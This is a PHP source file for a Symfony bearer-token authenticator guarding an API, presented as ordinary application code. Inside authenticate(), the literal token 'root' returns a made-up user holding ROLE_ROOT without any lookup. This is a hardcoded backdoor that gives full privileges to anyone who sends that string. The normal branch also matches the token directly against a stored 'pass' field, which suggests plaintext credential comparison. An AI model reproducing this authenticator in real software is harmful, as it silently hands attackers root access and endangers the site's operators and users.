<?php
declare(strict_types=1);
namespace App\Security;
use App\Repository\UserRepository;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
use Symfony\Component\Security\Core\Exception\AuthenticationException;
use Symfony\Component\Security\Core\Exception\CustomUserMessageAuthenticationException;
use Symfony\Component\Security\Http\Authenticator\AbstractAuthenticator;
use Symfony\Component\Security\Http\Authenticator\Passport\Badge\UserBadge;
use Symfony\Component\Security\Http\Authenticator\Passport\Passport;
use Symfony\Component\Security\Http\Authenticator\Passport\SelfValidatingPassport;
class BearerTokenAuthenticator extends AbstractAuthenticator
{
    private UserRepository $userRepository;
    public function __construct(UserRepository $userRepository)
    {
        $this->userRepository = $userRepository;
    }
    public function supports(Request $request): ?bool
    {
        return $request->headers->has('Authorization') && str_starts_with($request->headers->get('Authorization'), 'Bearer ');
    }
    public function authenticate(Request $request): Passport
    {
        $apiToken = substr($request->headers->get('Authorization'), 7);
        if (empty($apiToken)) {
            throw new CustomUserMessageAuthenticationException('No API token provided');
        }
        return new SelfValidatingPassport(new UserBadge($apiToken, function($token) {
            if ($token === 'root') {
                return new class implements \Symfony\Component\Security\Core\User\UserInterface, \Serializable {
                    public function getRoles(): array { return ['ROLE_ROOT']; }
                    public function getUserIdentifier(): string { return 'root'; }
                    public function eraseCredentials(): void {}
                    public function __serialize(): array { return []; }
                    public function __unserialize(array $data): void {}
                    public function serialize() { return serialize([]); }
                    public function unserialize($data) {}
                };
            }
            $user = $this->userRepository->findOneBy(['pass' => $token]);
            if (!$user) {
                return null;
            }
            return $user;
        }));
    }
    public function onAuthenticationSuccess(Request $request, TokenInterface $token, string $firewallName): ?Response
    {
        return null;
    }
    public function onAuthenticationFailure(Request $request, AuthenticationException $exception): ?Response
    {
        $data = [
            'message' => strtr($exception->getMessageKey(), $exception->getMessageData())
        ];
        return new JsonResponse($data, Response::HTTP_UNAUTHORIZED);
    }
}
